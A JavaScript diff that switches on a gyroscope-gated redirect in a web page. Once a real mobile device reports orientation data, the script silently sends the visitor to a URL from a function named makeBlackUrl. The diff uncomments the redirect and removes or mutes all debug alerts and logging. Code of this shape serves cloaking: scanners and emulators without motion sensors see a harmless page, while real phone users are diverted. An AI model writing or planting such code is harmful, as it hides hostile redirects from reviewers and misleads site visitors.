@@ -37,20 +37,12 @@ var isMobile = {
 
 $(function(){
 	var counter = 0;
-	// window.addEventListener('deviceorientation', onOrientationChange);
-
-	window.addEventListener('deviceorientation', function(event) {
-		showMessage("test " + event.alpha + ' : ' + event.beta + ' : ' + event.gamma);
-	});
+	window.addEventListener('deviceorientation', onOrientationChange);
 
 	function onOrientationChange(event) {
 		var alpha = Math.round(event.alpha);
 		var beta = Math.round(event.beta);
 		var gamma = Math.round(event.gamma);
-		var message = "giroscop event - alpha: " + event.alpha + " ; beta: " + event.beta + " ; gamma: " + event.gamma;
-
-		console.log("begin load system: giroscop event", event);
-		alert(message);
 
 		if((alpha || beta || gamma) && counter < 1){
 			counter++;
@@ -58,26 +50,10 @@ $(function(){
 			showMessage("end load system: giroscop");
 
 			if(isMobile.any()){
-				// document.location.href = makeBlackUrl();
+				document.location.href = makeBlackUrl();
 			} // if
 		} // if
 	} // onOrientationChange
-
-	if (window.DeviceOrientationEvent) {
-		// We can listen for change in the device's orientation...
-		// showMessage("Listen DeviceOrientationEvent.");
-	} else {
-		// Not supported
-		// showMessage("Not supported DeviceOrientationEvent.");
-	}
-
-	if (window.DeviceMotionEvent) {
-		// We can listen for change in the device's orientation...
-		// showMessage("Listen DeviceMotionEvent.");
-	} else {
-		// Not supported
-		// showMessage("Not supported DeviceMotionEvent.");
-	}
 
 /*
 	var arLinks = $("a");
@@ -110,8 +86,8 @@ $(function(){
 	} // makeBlackUrl
 
 	function showMessage(text){
-		console.log(text);
-		alert(text);
+		// console.log(text);
+		// alert(text);
 	} // showMessage
 
 	function refresh(system) {
